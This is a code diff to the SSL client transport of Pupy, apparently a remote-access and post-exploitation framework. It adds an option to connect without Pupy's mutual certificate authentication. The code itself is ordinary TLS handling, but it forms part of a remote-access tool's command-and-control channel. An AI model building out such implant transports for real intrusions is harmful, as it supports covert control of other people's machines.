@@ -111,29 +111,51 @@ class PupyProxifiedTCPClient(PupyTCPClient):
 
 class PupySSLClient(PupyTCPClient):
     def __init__(self, *args, **kwargs):
-        try:
-            import pupy_credentials
+        self.ssl_auth = kwargs.pop('ssl_auth', True)
+        self.hostname = kwargs.pop('hostname', None)
 
-            self.SSL_CLIENT_CERT = pupy_credentials.SSL_CLIENT_CERT
-            self.SSL_CLIENT_KEY = pupy_credentials.SSL_CLIENT_KEY
-            self.SSL_CA_CERT = pupy_credentials.SSL_CA_CERT
-            self.ROLE = 'CLIENT'
+        if self.ssl_auth:
+            self.cert_reqs = ssl.CERT_REQUIRED
 
-        except:
-            from pupylib.PupyCredentials import Credentials
+            try:
+                import pupy_credentials
 
-            credentials = Credentials()
-            self.SSL_CLIENT_CERT = credentials['SSL_CLIENT_CERT']
-            self.SSL_CLIENT_KEY = credentials['SSL_CLIENT_KEY']
-            self.SSL_CA_CERT = credentials['SSL_CA_CERT']
-            self.ROLE = credentials.role
-        self.ciphers = 'HIGH:!aNULL:!MD5:!RC4:!3DES:!DES:!AES128@STRENGTH'
-        self.cert_reqs = ssl.CERT_REQUIRED
-        self.ssl_version = ssl.PROTOCOL_SSLv23 #alias for PROTOCOL_TLS for recent versions of python but works with older version missing TLS
+                self.SSL_CLIENT_CERT = pupy_credentials.SSL_CLIENT_CERT
+                self.SSL_CLIENT_KEY = pupy_credentials.SSL_CLIENT_KEY
+                self.SSL_CA_CERT = pupy_credentials.SSL_CA_CERT
+                self.ROLE = 'CLIENT'
+
+            except:
+                from pupylib.PupyCredentials import Credentials
+
+                credentials = Credentials()
+                self.SSL_CLIENT_CERT = credentials['SSL_CLIENT_CERT']
+                self.SSL_CLIENT_KEY = credentials['SSL_CLIENT_KEY']
+                self.SSL_CA_CERT = credentials['SSL_CA_CERT']
+                self.ROLE = credentials.role
+        else:
+            self.cert_reqs = ssl.CERT_NONE
+
+        self.ciphers = 'HIGH:!aNULL:!MD5:!RC4:!3DES:!DES'
+        self.ssl_version = ssl.PROTOCOL_SSLv23
 
         super(PupySSLClient, self).__init__(*args, **kwargs)
 
     def connect(self, host, port):
+        if self.ssl_auth:
+            return self.connect_pupy(host, port)
+        else:
+            return self.connect_any(host, port)
+
+    def connect_any(self, host, port):
+        socket = super(PupySSLClient, self).connect(host, port)
+        ctx = ssl.create_default_context()
+        return ctx.wrap_socket(
+            socket,
+            server_hostname=self.hostname or host
+        )
+
+    def connect_pupy(self, host, port):
         socket = super(PupySSLClient, self).connect(host, port)
         try:
             fd_cert_path, tmp_cert_path = tempfile.mkstemp()
